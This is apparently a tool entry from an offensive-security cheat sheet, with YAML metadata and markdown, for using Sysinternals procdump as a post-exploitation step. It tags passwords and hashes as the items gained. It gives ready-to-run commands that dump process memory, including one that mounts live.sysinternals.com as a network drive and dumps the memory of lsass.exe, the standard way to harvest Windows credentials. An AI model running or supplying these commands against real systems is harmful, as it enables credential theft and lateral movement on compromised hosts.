---
trust_level: community
id: darkiros-procdump
namespace: darkiros:tool:procdump
name: "procdump"
description: "Dump a process memory - local"
version: "1.0.0"
capabilities:
  - security.execution.post-exploitation
platforms:
  - cross-platform
techniques:
  - execution
execution:
  template: "procdump"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Dump a process memory - local"
    command: "procdump.exe -accepteula -ma [pid or name] [output]"
  - description: "Dump a process memory - remote"
    command: "net use Z: https://live.sysinternals.com; Z:\\\\procdump.exe -accepteula -ma [lsass_exe] [lsass_dmp]"
items:
  - Password
  - Hash
services:
  - SMB
---

# procdump

Darkiros cheat sheet commands:

**Dump a process memory - local**
```
procdump.exe -accepteula -ma [pid or name] [output]
```

**Dump a process memory - remote**
```
net use Z: https://live.sysinternals.com; Z:\\procdump.exe -accepteula -ma [lsass_exe] [lsass_dmp]
```
